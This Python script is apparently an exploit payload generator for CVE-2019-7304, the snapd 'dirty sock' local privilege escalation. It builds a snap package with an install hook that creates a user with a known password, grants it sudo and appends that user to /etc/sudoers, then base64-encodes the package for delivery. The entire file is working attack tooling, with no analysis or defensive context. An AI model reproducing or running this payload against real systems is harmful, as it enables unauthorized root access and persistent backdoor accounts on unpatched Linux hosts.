'''
CVE-2019-7304 - Payload creator

Install snapcraft:
sudo apt install snapcraft -y
'''

#!/usr/bin/env python

import sys
from subprocess import PIPE, Popen
import os
import errno
import argparse
import crypt
import base64
from shutil import rmtree

yaml = '''
\n
name: dirty-sock
version: '0.1' 
summary: Empty snap, used for exploit
description: |
    See https://github.com/initstring/dirty_sock

grade: devel
confinement: devmode

parts:
  my-part:
    plugin: nil
'''


install_file = "snap/hooks/install"
yaml_file = "snap/snapcraft.yaml"

def dir_create(path):

    if not os.path.exists(os.path.dirname(path)):
        try:
            os.makedirs(os.path.dirname(path))
        except OSError as exc:
            if exc.errno != errno.EEXIST:
                raise

def generate_script(user, password):

    shadowhash = crypt.crypt(password, "$6$saltsalt$")
    bash = "#!/bin/bash\n\n"
    bash += "useradd {} -m -p '{}' -s /bin/bash \n".format(user, shadowhash)
    bash += "usermod -aG sudo {} \n".format(user)
    bash += "echo '{}    ALL=(ALL:ALL) ALL' >> /etc/sudoers \n".format(user)

    return bash

def file_writer(path, data):

    with open(path, 'a+') as f:
            f.write(data)


def start(snap_path, user, password):
    snap_file = ''
    install_path = snap_path + install_file
    yaml_path = snap_path + yaml_file

    dir_create(snap_path)
    os.chdir(snap_path)
    with open(os.devnull, 'w') as devnull:
        Popen(['snapcraft', 'init'],stdin=devnull, stdout=devnull, stderr=devnull)
    bash_script = generate_script(user, password)

    dir_create(install_path)

    file_writer(install_path, bash_script)
    os.chmod(snap_path+install_file, 0o755)

    file_writer(yaml_path, yaml)

    with open(os.devnull, 'w') as devnull:
        p = Popen(['snapcraft'], stdin=devnull, stdout=PIPE, stderr=devnull)

        stdout, stderr = p.communicate()

    out_list = str(stdout).split("\\n")

    for item in out_list:
        if ".snap" in item:
            snap_file = item.split(' ')[1]
    with open(snap_path+snap_file, "rb") as obj:
        encoded = base64.b64encode(obj.read()).decode("utf-8")
    substring = "A" * 100
    base64_obj = encoded.split(str(substring), 1)[0]

    return base64_obj

def main(argv):

    parser = argparse.ArgumentParser()
    parser.add_argument('--user', help="Sudo user account to add -- Default 'escalate'",
                        default='escalate')
    parser.add_argument('--password', help="Password for new user -- Default 'escalate'",
                        default='escalate')
    parser.add_argument('--snapdir', help="Base directory for snapcraft -- Default '/tmp/dirty'",
                        default='/tmp/dirty/')

    args = parser.parse_args()
    user = args.user
    password = args.password
    snapdir = args.snapdir

    output = start(snapdir, user, password)
    print(output)
    print("Cleaning up....")
    rmtree(snapdir)

if __name__ == "__main__":
   main(sys.argv[1:])